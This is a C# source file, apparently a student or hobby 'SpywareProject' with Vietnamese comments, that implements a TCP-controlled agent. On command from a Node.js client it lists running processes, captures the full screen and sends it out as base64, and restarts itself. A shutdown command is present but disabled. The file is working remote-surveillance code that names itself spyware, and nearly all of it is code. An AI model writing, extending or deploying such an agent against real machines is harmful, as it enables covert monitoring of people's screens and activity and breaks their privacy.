using System;
using System.Collections.Generic;
using System.Drawing;               // Cần Add Reference: System.Drawing
using System.Drawing.Imaging;       // Để lưu ảnh
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;         // Cần Add Reference: System.Windows.Forms (để lấy Screen.Bounds)
using System.Diagnostics;           // Để lấy danh sách Process

namespace SpywareProject
{
    public class Feature
    {
        // Biến toàn cục để giữ kết nối
        private TcpListener _server;
        private TcpClient _client;
        private NetworkStream _stream;
        private bool _isRunning = false;

        // Sự kiện để báo ra giao diện chính (Form) cập nhật trạng thái (Optional)
        public event Action<string> OnLog;

        // 1. HÀM KHỞI ĐỘNG SERVER
        public void StartServer(string ipAddress, int port)
        {
            try
            {
                IPAddress localAddr = IPAddress.Parse(ipAddress);
                _server = new TcpListener(localAddr, port);
                _server.Start();
                _isRunning = true;

                Log($"Server đã mở tại {ipAddress}:{port}. Đang chờ Node.js kết nối...");

                // Tạo luồng riêng để lắng nghe kết nối (để không đơ giao diện chính)
                Thread listenThread = new Thread(ListenForClients);
                listenThread.IsBackground = true;
                listenThread.Start();
            }
            catch (Exception ex)
            {
                Log("Lỗi khởi tạo Server: " + ex.Message);
            }
        }

        // 2. VÒNG LẶP LẮNG NGHE KẾT NỐI
        private void ListenForClients()
        {
            try
            {
                while (_isRunning)
                {
                    // Chờ client (Node.js) kết nối
                    _client = _server.AcceptTcpClient();
                    Log("Client (Node.js) đã kết nối!");

                    _stream = _client.GetStream();
                    
                    // Bắt đầu vòng lặp đọc dữ liệu từ client này
                    HandleClientComm(_client);
                }
            }
            catch (SocketException)
            {
                // Lỗi xảy ra khi server bị stop đột ngột, có thể bỏ qua
            }
        }

        // 3. XỬ LÝ DỮ LIỆU ĐẾN (CORE LOGIC)
        private void HandleClientComm(TcpClient client)
        {
            byte[] buffer = new byte[1024*1024]; // Buffer 1MB
            int bytesRead;

            try
            {
                while ((bytesRead = _stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    // Chuyển byte thành string
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    Log("Nhận lệnh: " + command);

                    // --- PHÂN TÍCH LỆNH TỪ JAVASCRIPT ---
                    ProcessCommand(command);
                }
            }
            catch
            {
                Log("Client đã ngắt kết nối.");
            }
        }

        // 4. BỘ NÃO XỬ LÝ LỆNH (SWITCH-CASE)
        private void ProcessCommand(string cmd)
        {
            // cmd nhận được sẽ là các chuỗi như: "CMD_GET_PROCESS", "CMD_SCREENSHOT"...
            
            switch (cmd)
            {
                case "CMD_GET_PROCESS":
                    string procList = GetProcessList();
                    SendData("LIST_PROC:" + procList); 
                    break;

                case "CMD_SCREENSHOT":
                    string base64Img = TakeScreenshot();
                    // Gửi prefix để JS biết đây là ảnh
                    SendData("IMG_BASE64:" + base64Img); 
                    break;

                case "CMD_GET_APPS":
                    // Demo trả về dữ liệu giả lập hoặc bạn tự viết hàm đọc Registry
                    SendData("LOG: Tính năng lấy danh sách App đang phát triển...");
                    break;

                case "CMD_PING":
                    SendData("PONG: Server C# vẫn sống!");
                    break;

                case "CMD_RESTART":
                    Log("Đang khởi động lại chương trình...");
                    Application.Restart();
                    Environment.Exit(0);
                    break;

                case "CMD_SHUTDOWN":
                    Log("Đang tắt máy...");
                    // Process.Start("shutdown", "/s /t 0"); // Cẩn thận khi test lệnh này!
                    SendData("LOG: Lệnh tắt máy đã được nhận (đang bị vô hiệu hóa để an toàn).");
                    break;

                default:
                    // Nếu lệnh lạ, cứ in ra log
                    SendData("LOG: Không hiểu lệnh " + cmd);
                    break;
            }
        }

        // --- CÁC HÀM CHỨC NĂNG (FEATURES) ---

        // Chức năng A: Lấy danh sách Process
        private string GetProcessList()
        {
            StringBuilder sb = new StringBuilder();
            Process[] processList = Process.GetProcesses();

            foreach (Process p in processList)
            {
                sb.Append(p.ProcessName + " (ID: " + p.Id + ")\n");
            }
            return sb.ToString();
        }

        // Chức năng B: Chụp màn hình
        private string TakeScreenshot()
        {
            try
            {
                // Lấy kích thước màn hình
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    // Chuyển ảnh thành chuỗi Base64 để gửi qua mạng
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Png);
                        byte[] imageBytes = ms.ToArray();
                        return Convert.ToBase64String(imageBytes);
                    }
                }
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        // --- HÀM HỖ TRỢ GỬI DỮ LIỆU ---
        private void SendData(string data)
        {
            if (_client != null && _client.Connected)
            {
                byte[] msg = Encoding.UTF8.GetBytes(data);
                _stream.Write(msg, 0, msg.Length);
                Log("Đã gửi phản hồi (" + msg.Length + " bytes).");
            }
        }

        // Hàm log helper để gọi event ra Form
        private void Log(string msg)
        {
            // Gọi event nếu có người đăng ký (để hiện lên TextBox bên Form chính)
            OnLog?.Invoke(msg); 
        }

        // Hủy kết nối khi tắt app
        public void Stop()
        {
            _isRunning = false;
            _server?.Stop();
            _client?.Close();
        }
    }
}